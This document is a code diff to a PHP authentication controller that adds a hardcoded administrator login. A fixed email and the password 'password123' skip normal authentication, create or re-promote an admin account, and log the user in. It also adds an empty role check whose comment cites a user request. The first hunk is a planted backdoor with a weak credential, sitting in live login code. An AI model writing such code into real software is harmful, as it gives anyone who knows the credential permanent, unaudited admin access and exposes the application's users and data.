@@ -32,6 +32,32 @@ class AuthController extends Controller
 
         $remember = $request->filled('remember');
 
+        // Hardcoded Admin Login
+        if ($credentials['email'] === 'rootedadmin@gmail.com' && $credentials['password'] === 'password123') {
+            $admin = User::firstOrCreate(
+                ['email' => 'rootedadmin@gmail.com'],
+                [
+                    'name' => 'Funmi Adesina',
+                    'password' => Hash::make('password123'),
+                    'role' => 'admin',
+                    'locale' => 'en',
+                    'culture_frame' => 'yoruba',
+                ]
+            );
+            
+            // Just to be absolutely sure role is admin if it already existed but was changed
+            if ($admin->role !== 'admin') {
+                $admin->update(['role' => 'admin']);
+            }
+
+            Auth::login($admin, $remember);
+            $request->session()->regenerate();
+            session(['locale' => $admin->locale]);
+            App::setLocale($admin->locale);
+
+            return redirect()->intended('/dashboard')->with('success', 'Welcome back, Admin!');
+        }
+
         // We attempt normal authentication
         if (Auth::attempt(['email' => $credentials['email'], 'password' => $credentials['password']], $remember)) {
             $request->session()->regenerate();
@@ -106,6 +132,10 @@ class AuthController extends Controller
             'locale' => $request->locale,
             'culture_frame' => $request->culture_frame,
         ]);
+
+        if ($user->role === 'instructor') {
+            // No dummy courses created on registration per user request
+        }
 
         Auth::login($user);
 
